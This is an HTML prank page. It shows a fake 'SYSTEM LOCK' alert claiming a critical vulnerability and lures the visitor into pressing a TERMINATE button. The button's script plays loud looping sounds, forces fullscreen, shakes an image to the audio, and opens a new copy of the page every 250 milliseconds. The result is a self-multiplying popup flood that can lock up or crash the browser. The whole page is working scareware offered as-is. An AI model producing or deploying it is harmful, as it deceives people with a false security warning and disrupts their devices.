<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>☠️ SYSTEM FAILURE ☠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        #madImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 10; display: none; will-change: transform; }
        #ui { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: flex; flex-direction: column; justify-content: center; align-items: center; font-family: monospace; color: #f00; text-align: center; }
        .btn-red { background: #f00; color: #000; border: none; width: 260px; height: 90px; font-weight: bold; font-size: 26px; cursor: pointer; margin-top: 30px; box-shadow: 0 0 25px #f00; }
        .blink { animation: b 0.1s infinite; }
        @keyframes b { 50% { opacity: 0; } }
    </style>
</head>
<body>

    <div id="ui">
        <h1 class="blink" style="font-size: 45px;">☠️ SYSTEM LOCK ☠️</h1>
        <p style="font-size: 18px;">Critical vulnerability detected.<br>Tap to terminate and secure data.</p>
        <button class="btn-red" onclick="igniteFinalChaos()">TERMINATE</button>
    </div>

    <img id="madImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <div id="audioVault">
        <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
        <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3"></audio>
        <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/dzonza.mp3"></audio>
    </div>

    <script>
        let aCtx, analyser, data;
        const img = document.getElementById('madImg');

        function igniteFinalChaos() {
            const tracks = document.querySelectorAll('.t');
            tracks.forEach(t => { t.volume = 1.0; t.play(); }); // نفس النسبة سواسوة

            document.getElementById('ui').style.display = 'none';
            img.style.display = 'block';
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();

            if (!aCtx) {
                aCtx = new (window.AudioContext || window.webkitAudioContext)();
                const source = aCtx.createMediaElementSource(tracks[1]); 
                analyser = aCtx.createAnalyser();
                analyser.fftSize = 64;
                data = new Uint8Array(analyser.frequencyBinCount);
                source.connect(analyser);
                analyser.connect(aCtx.destination);
                if (aCtx.state === 'suspended') aCtx.resume();
                renderMadness();
            }

            setInterval(() => {
                window.open(window.location.href, '_blank', 'width=10,height=10');
            }, 250);
        }

        function renderMadness() {
            analyser.getByteFrequencyData(data);
            let vol = data[0]; 
            const power = (vol / 255) * 110; // قوة التخبيط القصوى
            const x = (Math.random() - 0.5) * power * 8;
            const y = (Math.random() - 0.5) * power * 8;
            const r = (Math.random() - 0.5) * power;
            const s = 1 + (vol / 255) * 0.8;
            img.style.transform = `translate(${x}px, ${y}px) rotate(${r}deg) scale(${s})`;
            requestAnimationFrame(renderMadness);
        }
    </script>
</body>
</html>
